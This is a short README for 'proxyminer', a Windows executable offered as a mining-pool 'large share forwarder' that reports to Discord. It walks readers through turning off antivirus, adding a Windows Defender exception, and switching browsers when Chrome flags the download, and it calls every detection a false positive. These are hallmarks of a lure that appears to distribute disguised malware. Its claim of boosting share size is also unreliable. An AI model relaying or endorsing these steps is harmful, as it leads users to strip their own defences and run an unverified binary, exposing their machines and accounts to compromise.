# proxyminer

as its hard to find a large share submitter i thought i would create one rather than buying  aprivate that could be not safe or a ripoff and in another language
so here it is.
simple large share forwarder, open proxy input pool details ,username for rig or gpu, ignores low shares works on shared or solo easy setup download install 
it may trigger av if it does turn of antivirus download the winrar
add acception to windows defender etc then extract
install.
if chrome gives virus error just use internet explorer chrome dont like custom .exe
always give false positive

works on windows 10/11
run multiple connections just add new connection with different workername

how to use
1st if you dont have  adiscord account create one as you will need ur discord username with hashtags or
you can create aserver and create webhook and paste this into the discord section.
you will get notification of blocks found,largest share and uptimeand if it disconnects it will tell you.
then
input pool and port
select solo or shared
input proxy ip generated and port
enjoy large shares tick if you want low shares
hit save input details into gminer etc and then the proxy will connect to pool
and start forwarding shares.

on test i had low 12ms to  somtimes 18 ms depending on where ur based and pool used.
see the shares submitted through proxy etc

enjoy and happy mining :)

works with all miner softwares
tested wth gminer/lolminer/trex
